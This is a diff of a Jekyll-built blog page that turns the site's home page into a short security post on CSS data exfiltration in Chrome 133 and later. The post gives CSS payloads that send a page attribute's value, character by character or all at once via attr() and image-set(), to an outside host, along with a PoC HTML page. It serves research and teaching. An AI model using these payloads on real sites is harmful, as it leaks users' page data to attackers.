@@ -35,24 +35,24 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="Web2.0" />
+<meta property="og:title" content="CSS Exfiltration via attr() + image-set() from Chrome 133" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<link rel="canonical" href="http://localhost:4000/" />
-<meta property="og:url" content="http://localhost:4000/" />
+<meta name="description" content="The article is about how to exploit css exfiltration via attr() on &gt;=Chrome 133. After Chrome 133 was released, users are able to load resources via the image-set(var(–val)) after getting data from attr via the attr()" />
+<meta property="og:description" content="The article is about how to exploit css exfiltration via attr() on &gt;=Chrome 133. After Chrome 133 was released, users are able to load resources via the image-set(var(–val)) after getting data from attr via the attr()" />
+<link rel="canonical" href="http://localhost:4000/posts/css-exfiltration/" />
+<meta property="og:url" content="http://localhost:4000/posts/css-exfiltration/" />
 <meta property="og:site_name" content="Web2.0" />
-<meta property="og:type" content="website" />
-<link rel="next" href="http://localhost:4000/page2" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-04-15T09:00:00+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Web2.0" />
+<meta property="twitter:title" content="CSS Exfiltration via attr() + image-set() from Chrome 133" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","name":"anonymous","sameAs":["https://x.com/l0ptus"],"url":"http://localhost:4000/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-15T09:00:00+09:00","datePublished":"2025-04-15T09:00:00+09:00","description":"The article is about how to exploit css exfiltration via attr() on &gt;=Chrome 133. After Chrome 133 was released, users are able to load resources via the image-set(var(–val)) after getting data from attr via the attr()","headline":"CSS Exfiltration via attr() + image-set() from Chrome 133","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/css-exfiltration/"},"url":"http://localhost:4000/posts/css-exfiltration/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>Web2.0
+  <title>CSS Exfiltration via attr() + image-set() from Chrome 133 | Web2.0
   </title>
 
   <!--
@@ -102,11 +102,16 @@
   <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
 
   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
+  
 
   
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
   
 
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
   
 
   <!-- JavaScript -->
@@ -456,7 +461,7 @@
   <nav class="flex-column flex-grow-1 w-100 ps-0">
     <ul class="nav">
       <!-- home -->
-      <li class="nav-item active">
+      <li class="nav-item">
         <a href="/" class="nav-link">
           <i class="fa-fw fas fa-home"></i>
           <span>HOME</span>
@@ -542,9 +547,25 @@
       
 
       
-        <!-- index page -->
-        <span>Home</span>
+        
+          
+            <span>
+              <a href="/">
+                Home
+              </a>
+            </span>
 
+          
+        
+          
+        
+          
+            
+              <span>CSS Exfiltration via attr() + image-set() from Chrome 133</span>
+            
+
+          
+        
       
     </nav>
     <!-- endof #breadcrumb -->
@@ -554,7 +575,7 @@
     </button>
 
     <div id="topbar-title">
-      Web2.0
+      Post
     </div>
 
     <button type="button" id="search-trigger" class="btn btn-link">
@@ -608,6 +629,148 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
 
 <!-- Add header for code snippets -->
 
@@ -622,6 +785,49 @@
   
   
 
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
   
 
   
@@ -647,125 +853,15 @@
 
 
 
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>CSS Exfiltration via attr() + image-set() from Chrome 133</h1>
 
-
-
-
-
-<!-- Get pinned posts -->
-
-
-
-
-
-
-<!-- Get default posts -->
-
-
-
-
-
-
-
-
-
-
-<div id="post-list" class="flex-grow-1 px-xl-1">
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Just-CTF-2025/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">JustCTF 2025 Positive Players Write Up</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1754179200"
-  data-df="ll"
-  
->
-  Aug  3, 2025
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/css-exfiltration/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">CSS Exfiltration via attr() + image-set() from Chrome 133</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Summary
-
-input[name=flag][value^=a]{
-    background: url(&#39;https://evm.pics/a&#39;);
-}
-input[name=flag][value^=b]{
-    background: url(&#39;https://evm.pics/b&#39;);
-}
-/* ... */
-
-In most cases, when exploiting ...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
   Date format snippet
   See: ${JS_ROOT}/utils/locale-dateime.js
 -->
@@ -778,371 +874,237 @@ In most cases, when exploiting ...
   data-ts="1744675200"
   data-df="ll"
   
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
 >
   Apr 15, 2025
 </time>
 
+      </span>
 
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/XSS-in-ML-Framework/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1694656853"
-  data-df="ll"
-  
->
-  Sep 14, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/ReDos-in-Github/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">0-Day, Copy and Paste ReDoS in github.com</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Summary
-In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.
-
-
-Analysis
-
-function onPaste$1(event) {
-    const { currentTarget: el } = eve...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1691226053"
-  data-df="ll"
-  
->
-  Aug  5, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Line-CTF/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Line CTF 2023 Write Up</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                
-  (Web) Baby Simple Gocurl 
-  (Web) Adult Simple Gocurl
-
-
-These two challenges require reading flag in the /flag/ path via SSRF.
-
-
-
-(Web) Baby Simple Gocurl
-
-n.startsWith(&quot;https://&quot;) || n.startsWi...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1679821253"
-  data-df="ll"
-  
->
-  Mar 26, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-</div>
-<!-- #post-list -->
-
-
-  <!-- The paginator for post list on HomgPage. -->
-
-<nav aria-label="Page Navigation">
-  <ul class="pagination align-items-center mt-4 mb-0">
-    <!-- left arrow -->
-    
-
-    <li class="page-item disabled">
-      <a class="page-link" href="#" aria-label="previous-page">
-        <i class="fas fa-angle-left"></i>
-      </a>
-    </li>
-
-    <!-- page numbers -->
-    
-    
-
-    
-      
-      
-      
-      
+      <!-- lastmod date -->
       
 
       
 
-      
-        <!-- show number -->
-        <li class="page-item  active">
-          <a
-            class="page-link"
-            href="/"
-          >1</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page2"
-          >2</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page3"
-          >3</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- hide number -->
-        
-          <li class="page-item disabled">
-            <span class="page-link">...</span>
-          </li>
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
           
+
+          By
+
+          <em>
+            
+              <a href="https://x.com/l0ptus">anonymous</a>
+            
+          </em>
+        </span>
+
+        <!-- read time -->
+        <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="331 words"
+>
+  <em>1 min</em> read</span>
+
+      </div>
+      <!-- .d-flex -->
+    </div>
+    <!-- .post-meta -->
+  </header>
+
+  <div class="content">
+    <h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="language-css highlighter-rouge"><div class="code-header">
+        <span data-label-text="CSS"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">flag</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="nt">a</span><span class="o">]</span><span class="p">{</span>
+    <span class="nl">background</span><span class="p">:</span> <span class="sx">url('https://evm.pics/a')</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">flag</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="nt">b</span><span class="o">]</span><span class="p">{</span>
+    <span class="nl">background</span><span class="p">:</span> <span class="sx">url('https://evm.pics/b')</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c">/* ... */</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>In most cases, when exploiting CSS exfiltration, they should have attempted to leak data using a payload like the one shown above. However, the process is often tedious, as each word must be leaked step by step but recently they can leak data at once not leaking as each words after Chrome 133 was released</p>
+
+<hr />
+<h2 id="css-attr-gets-an-upgrade-from-chrome-133"><span class="me-2">CSS attr() gets an upgrade from Chrome 133</span><a href="#css-attr-gets-an-upgrade-from-chrome-133" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1361997721535516823/image.png?ex=6800cab9&amp;is=67ff7939&amp;hm=1a5181d52767c9685d7220a3f9bd3f3a90f369b81c800f85a7f864672049caca&amp;=&amp;format=webp&amp;quality=lossless&amp;width=1420&amp;height=801" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1361997721535516823/image.png?ex=6800cab9&amp;is=67ff7939&amp;hm=1a5181d52767c9685d7220a3f9bd3f3a90f369b81c800f85a7f864672049caca&amp;=&amp;format=webp&amp;quality=lossless&amp;width=1420&amp;height=801" alt="" loading="lazy"></a></p>
+
+<p>As you can check attr() function has been upgraded from Chrome 133, means it allows to get attrs data from tags so if attacker can use this function as well, the data will be leaked all data at once, i.e, words, they don’t need to leak each word step by step</p>
+
+<div class="language-html highlighter-rouge"><div class="code-header">
+        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>  <span class="nt">&lt;input</span> <span class="na">flag=</span><span class="s">"flag{css-csscscscscscscs}"</span><span class="nt">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>let’s say there is an example like this. In the past, we would probably try to leak one word at a time but we don’t need to do that anymore we can just leak all data at once via attr()</p>
+
+<hr />
+<h2 id="payload-to-leak-data"><span class="me-2">Payload to Leak data</span><a href="#payload-to-leak-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="language-css highlighter-rouge"><div class="code-header">
+        <span data-label-text="CSS"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>        <span class="nt">--val</span><span class="o">:</span> <span class="nt">attr</span><span class="o">(</span><span class="nt">flag</span><span class="o">);</span>
+        <span class="nt">background</span><span class="o">:</span> <span class="nt">url</span><span class="o">(</span><span class="nt">var</span><span class="o">(</span><span class="nt">--val</span><span class="o">));</span> <span class="o">//</span> <span class="nt">Invalid</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>First of all, we can’t use url() since it was blocked for security so need to use image-set() function to leak data to external url</p>
+
+<div class="language-css highlighter-rouge"><div class="code-header">
+        <span data-label-text="CSS"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>    <span class="nt">form</span> <span class="p">{</span>
+      <span class="py">--val</span><span class="p">:</span> <span class="n">attr</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+      <span class="nl">background</span><span class="p">:</span> <span class="n">image-set</span><span class="p">(</span><span class="n">var</span><span class="p">(</span><span class="n">--val</span><span class="p">));</span>
+    <span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>The payload can be written like this and image-set() function load resources based on the base URL so we should add the &lt;link&gt; tag to web page where the sensitive data is located</p>
+
+<div class="language-html highlighter-rouge"><div class="code-header">
+        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;title&gt;</span>CSS attr() PoC<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://evm.pics/poc/exfiltration1.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">flag=</span><span class="s">"flag{css-csscscscscscscs}"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Create the HTML file then open it</p>
+
+<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1362005721788583936/image.png?ex=6800d22c&amp;is=67ff80ac&amp;hm=5bad1fe96a5bc51b0db5efa7c76a2f81c1bfe4c8c56542736dc0b942126368a0&amp;=&amp;format=webp&amp;quality=lossless&amp;width=993&amp;height=223" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1362005721788583936/image.png?ex=6800d22c&amp;is=67ff80ac&amp;hm=5bad1fe96a5bc51b0db5efa7c76a2f81c1bfe4c8c56542736dc0b942126368a0&amp;=&amp;format=webp&amp;quality=lossless&amp;width=993&amp;height=223" alt="" loading="lazy"></a></p>
+
+<p>We can check that the flag was leaked to attacker’s server</p>
+
+<p>However, this approach does not allow access to certain properties like the value of input elements, which imposes clear limitations on its use in practical attacks</p>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+
+    <!-- tags -->
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
         
-      
-    
-      
-      
-      
-      
-      
+          
 
-      
-
-      
-        <!-- hide number -->
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
         
-      
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
     
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- hide number -->
-        
-      
     
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page7"
-          >7</a>
-        </li>
-      
     
 
-    <!-- mobile pagination -->
-    <li class="page-index align-middle">
-      <span>1</span>
-      <span class="text-muted">/ 7</span>
-    </li>
-
-    <!-- right arrow -->
     
 
-    <li class="page-item ">
-      <a class="page-link" href="/page2" aria-label="next-page">
-        <i class="fas fa-angle-right"></i>
+      
+
+      <a href="https://twitter.com/intent/tweet?text=CSS%20Exfiltration%20via%20attr()%20+%20image-set()%20from%20Chrome%20133%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fcss-exfiltration%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
-    </li>
-  </ul>
-</nav>
-<!-- .pagination -->
+    
 
+      
 
+      <a href="https://www.facebook.com/sharer/sharer.php?title=CSS%20Exfiltration%20via%20attr()%20+%20image-set()%20from%20Chrome%20133%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fcss-exfiltration%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fcss-exfiltration%2F&text=CSS%20Exfiltration%20via%20attr()%20+%20image-set()%20from%20Chrome%20133%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
 
 
             
@@ -1208,12 +1170,94 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
             </div>
 
             
+              
+              
+
+
+
+  <section id="toc-wrapper" class="ps-0 pe-4">
+    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
           </aside>
         </div>
 
         <div class="row">
           <!-- tail -->
           <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/XSS-in-ML-Framework/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/Just-CTF-2025/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>JustCTF 2025 Positive Players Write Up</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!--  The comments switcher -->
+
+
             
 
             <!-- The Footer -->
@@ -1328,6 +1372,9 @@ style="background-color:#030014"
   
 
   
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
 
 
 
@@ -1399,16 +1446,37 @@ style="background-color:#030014"
 
   
 
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
 
 
-  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>
 
 
 
 
 
 
-<script defer src="/assets/js/dist/home.min.js"></script>
+<script defer src="/assets/js/dist/post.min.js"></script>
 
 
 
